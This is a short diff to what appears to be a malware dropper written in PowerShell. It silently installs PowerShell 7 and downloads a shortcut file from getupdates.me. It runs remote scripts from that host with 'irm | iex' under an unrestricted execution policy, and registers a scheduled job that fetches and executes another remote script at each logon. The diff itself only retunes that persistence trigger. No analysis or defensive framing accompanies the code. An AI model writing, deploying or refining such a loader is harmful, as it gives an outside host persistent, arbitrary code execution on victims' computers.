@@ -6,5 +6,5 @@ msiexec.exe /package Pwsh.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 
 Start-Sleep -Seconds 30
 Invoke-WebRequest -Uri "https://getupdates.me/Final.lnk" -OutFile "$env:HOMEPATH\Desktop\Finalize.lnk"
 Start-Process -FilePath "C:\Program Files\Powershell\7\pwsh.exe" -ArgumentList "-ExecutionPolicy Unrestricted -C irm https://getupdates.me/Part2.ps1 | iex"
-$trigger = New-JobTrigger -AtStartup -RandomDelay 00:00:30
+$trigger = New-JobTrigger -AtLogOn -RandomDelay 00:00:15
 Register-ScheduledJob -Trigger $trigger -ScriptBlock {pwsh -ExecutionPolicy unrestricted -C irm https://getupdates.me/Part4.ps1 | iex} -Name Final
